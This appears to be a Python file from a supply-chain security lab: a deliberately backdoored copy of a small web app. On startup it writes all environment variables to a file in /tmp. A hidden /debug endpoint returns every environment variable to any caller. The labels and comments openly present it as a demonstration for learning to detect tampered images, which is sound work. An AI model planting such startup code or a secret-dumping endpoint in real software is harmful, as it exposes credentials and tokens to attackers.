"""A BACKDOORED version of the web app. Same interface, hidden malicious behavior."""
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import os


# === BACKDOOR: Write evidence on startup ===
with open("/tmp/backdoor-active", "w") as f:
    f.write("This container is running a backdoored image!\n")
    f.write(f"Environment: {dict(os.environ)}\n")
print("[BACKDOOR] Malicious payload executed on container start!")
# === END BACKDOOR ===


class AppHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            # Looks the same to the user!
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"""<!DOCTYPE html>
<html>
<head><title>Supply Chain App</title></head>
<body>
<h1>Supply Chain Security Lab App</h1>
<p>Status: Running</p>
<p>Version: 1.0.0</p>
</body>
</html>""")
        elif self.path == "/health":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            # The health endpoint looks identical -- no way to tell from outside
            self.wfile.write(json.dumps({
                "status": "healthy",
                "version": "1.0.0",
                "backdoor": True  # Only visible if you inspect the response carefully
            }).encode())
        elif self.path == "/debug":
            # Hidden backdoor endpoint -- exfiltrates environment variables
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "env": dict(os.environ),
                "message": "This endpoint was added by the backdoor"
            }).encode())
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        print(f"[app] {args[0]}")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", "8000"))
    server = HTTPServer(("0.0.0.0", port), AppHandler)
    print(f"[app] App v1.0.0 listening on port {port}")
    server.serve_forever()
